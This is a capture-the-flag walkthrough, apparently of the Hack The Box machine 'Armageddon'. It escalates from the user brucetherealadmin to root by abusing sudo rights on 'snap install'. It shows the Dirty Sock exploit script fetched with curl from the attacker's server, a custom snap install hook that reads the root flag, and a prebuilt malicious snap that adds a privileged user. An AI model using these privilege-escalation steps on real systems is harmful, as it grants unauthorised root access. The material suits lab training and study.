# SSH as brucetherealadmin

As we know `su` was not working, I tried the following command to login as Bruce over SSH instead, supplying "booboo" as the password:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Sat Apr  3 14:48:28 2021 from 10.10.14.151
```

Success!

## Enumeration

Let's take a look at their files. We can grab the user flag now as well:

```bash
[brucetherealadmin@armageddon ~]$ ls -la
total 20
drwx------. 3 brucetherealadmin brucetherealadmin  132 Apr  3 13:23 .
drwxr-xr-x. 4 root              root                49 Apr  3 12:02 ..
lrwxrwxrwx. 1 root              root                 9 Dec 11 19:06 .bash_history -> /dev/null
-rw-r--r--. 1 brucetherealadmin brucetherealadmin   18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  231 Apr  1  2020 .bashrc
-rw-rw-r--. 1 brucetherealadmin brucetherealadmin 4096 Apr  3 12:01 dedsec.snap
drwx------. 2 brucetherealadmin brucetherealadmin   60 Apr  3 14:39 .gnupg
-r--------. 1 brucetherealadmin brucetherealadmin   33 Apr  3 12:01 user.txt
```

`dedsec.snap` is interesting. Running `sudo -l` shows `snap` can be run as root:

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Googling "snap install exploit" reveals a number of exploits... including Dirty Sock!

## Dirty Sock Exploit

I first read [an excellent article explaining the exploit](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html), and a [writeup of running dirty sock](http://www.hackersnotes.com/blog/pentest/linux-privilege-escalation-via-snapd-using-dirty_sock-exploit-and-demonstration-of-cve-2019-7304/) - it contains much the same info as the first article, but with a demo of running the script itself.

This is the [git repository](https://github.com/initstring/dirty_sock) for Dirty Sock.

I wasn't sure this would work out of the box, as I had a feeling we'd need to do some manual exploitation with the `install` command - but let's give it a go.

We'll download the script from git, move it to a `www` directory, and download it to the box.

```bash
┌──(mac㉿kali)-[/opt]
└─$ sudo git clone https://github.com/initstring/dirty_sock.git
Cloning into 'dirty_sock'...

┌──(mac㉿kali)-[/opt/dirty_sock]
└─$ cp dirty_sockv2.py ~/Documents/HTB/armageddon/
┌──(mac㉿kali)-[/opt/dirty_sock]
└─$ cd ~/Documents/HTB/armageddon/
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ mkdir www
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ mv dirty_sockv2.py www/ && cd www/
┌──(mac㉿kali)-[~/Documents/HTB/armageddon/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.233 - - [03/Apr/2021 16:04:22] "GET /dirty_sockv2.py HTTP/1.1" 200 -
```

On the box:

```bash
[brucetherealadmin@armageddon ~]$ curl 10.10.14.53:80/dirty_sockv2.py > /tmp/sock.py

[brucetherealadmin@armageddon tmp]$ python3 sock.py 

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/escgoauyif;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Sat, 03 Apr 2021 15:19:42 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

Interesting. True enough, the snap version is not vulnerable:

```bash
[brucetherealadmin@armageddon tmp]$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
```

We were right that we have to do some manual stuff. Let's recreate the exploit, using @init_string's example of an empty snap script with an install hook.

## Customising the Exploit

I think the path here will be to instead run `snap install` with root privileges, and hope that this runs the install hook.

This didn't work for me, due to hardware issues - however, I'm pretty sure my steps were correct. Nevertheless, if you don't want to read a failed attempt you can [[20 - SSH as brucetherealadmin#Repurposing the Dirty Sock Payload|skip to the final exploit]].

I don't want to create a user that anyone can log in as, so I'll try to rewrite the exploit to just read the root flag.

```bash
## Install necessary tools
sudo apt install snapcraft -y

## Make an empty directory to work with
cd /tmp
mkdir dirty_snap
cd dirty_snap

## Initialize the directory as a snap project
snapcraft init

## Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

## Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash

cat /root/root.txt > /tmp/gottem
EOF

## Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1'
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

## Build the snap
snapcraft
```

It seems snapcraft is not a valid `apt` package on Kali, so I used the snap [installation guide](https://snapcraft.io/docs/installing-snap-on-kali) and snapcraft [installation guide](https://snapcraft.io/docs/snapcraft-overview) to install instead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ sudo apt install snapd
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ systemctl enable --now snapd apparmor
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ sudo snap install snapcraft --classic
```

Then we need to add `/snap/bin` to path, editing `~/.bashrc`:

```bash
nano ~/.bashrc

...[bashrc file]...
export PATH="/snap/bin:$PATH"
...[bashrc file]...


source ~/.bashrc
```

Then initialise snapcraft:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ snapcraft init
Created snap/snapcraft.yaml.
```

Now we can edit the script's install instructions, commenting them out for now.

My first attempt at running the build script failed, as I had not set a [base](https://snapcraft.io/docs/base-snaps) for snap:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ./build-snap.sh 
mkdir: cannot create directory ‘dirty_snap’: File exists
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
This project is best built on 'Ubuntu 16.04', but is building on a 'Kali GNU/Linux 2021.1' host.
Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
Sorry, an error occurred in Snapcraft:
Native builds aren't supported on Kali GNU/Linux. You can however use 'snapcraft cleanbuild' with a container.
```

After reading a couple of [similar issues](https://forum.snapcraft.io/t/native-builds-arent-supported-on-manjaro-linux/12821), I added the `base: core18` line to the script:

```bash
## Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock
base: core18
```

After some [fumbling around](https://forum.snapcraft.io/t/building-for-core18-multipass-issue/8958/12) trying to get `snapcraft` to work on Kali, I found out that `multipass`, the [default build method](https://snapcraft.io/docs/build-options), creates a VM to build the snap within. For a nested VM, this requires acceleration. You can see from the output below that it fails to create the snap:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ./build-snap.sh 
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
Launching a VM.
Build environment is in unknown state, cleaning first.
WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
info failed: The following errors occurred:
instance "snapcraft-dirty-sock" does not exist
WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
launch failed: CPU does not support KVM extensions.                             
An error occurred with the instance when trying to launch with 'multipass': returned exit code 2.
Ensure that 'multipass' is setup correctly and try again.
```

I didn't have a Linux host machine, and didn't want to install snap on my Windows host, so I left this for now. But I'd be interested to go back to it and check if it worked.

## Repurposing the Dirty Sock Payload

As I couldn't get this to work myself, I will resort to using the prewritten script. 
I may return to this and try and create the snap on my host machine using WSL, but for now I will use the premade payload in the dirty sock blog and just create the dirty_sock user.

We use a python script to print the blob used in the dirty_sock source code, and base64 encode this:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ python3 print-snap.py | base64 -d > dirty.snap
```

Then we copy this via ssh to the box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ scp dirty.snap brucetherealadmin@10.10.10.233:/tmp/dirty.snap
```

Now we login as bruce, and install our malicious snap (I used the `--devmode` flag just in case):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password: 
Last login: Mon Apr  5 15:06:03 2021 from 10.10.14.56
[brucetherealadmin@armageddon ~]$ cd /tmp
[brucetherealadmin@armageddon tmp]$ sudo snap install --devmode dirty.snap 
dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: 
[dirty_sock@armageddon tmp]$ sudo cat /root/root.txt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: 
d9...[snip]...a4b

```

That's the box!

![[Pasted image 20210405151329.png]]

Now we can cleanup our snap:

```bash
[dirty_sock@armageddon tmp]$ sudo rm dirty.snap
```

I won't delete the user or change the password, just in case it interferes with someone else's exploit.

### Automation

We can create a very simple bash script to partially automate the above:

```bash
#!/bin/bash
python3 print-snap.py | base64 -d > dirty.snap
scp dirty.snap brucetherealadmin@10.10.10.233:/tmp/dirty.snap
ssh brucetherealadmin@10.10.10.233
```

We then just need to supply Bruce's password and run the dirty snap once we're on the box with `sudo snap install --devmode /tmp/dirty.snap`.